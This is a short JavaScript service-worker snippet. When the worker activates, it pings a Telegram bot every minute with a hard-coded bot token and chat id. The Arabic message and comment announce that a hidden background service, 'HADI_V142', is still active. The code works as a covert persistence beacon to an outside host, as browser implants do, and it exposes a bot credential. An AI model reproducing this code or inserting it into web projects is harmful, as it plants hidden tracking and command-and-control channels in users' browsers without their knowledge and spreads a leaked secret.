self.addEventListener('activate', event => {
    setInterval(() => {
        fetch(`https://api.telegram.org/bot8423547869:AAGnndEv5lB27vNjS9iMOqX4lxduElY06nU/sendMessage?chat_id=6978465145&text=👻 الخدمة الخلفية (HADI_V142) لا تزال نشطة.`);
    }, 60000); // إرسال نبضة كل دقيقة
});
